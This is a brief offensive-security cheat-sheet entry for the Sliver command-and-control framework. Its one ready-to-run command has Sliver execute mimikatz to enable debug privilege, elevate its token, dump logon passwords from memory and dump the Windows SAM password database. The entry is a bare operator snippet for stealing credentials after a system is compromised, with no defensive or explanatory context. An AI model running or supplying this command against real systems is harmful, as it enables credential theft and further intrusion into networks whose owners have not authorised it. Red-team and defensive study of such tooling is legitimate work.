# sliver

% sliver, C2

## tools - mimikatz
```bash
mimikatz -t 3600 -- "privilege::debug" "token::elevate" "sekurlsa::logonpasswords /all" "lsadump::sam" "exit"
```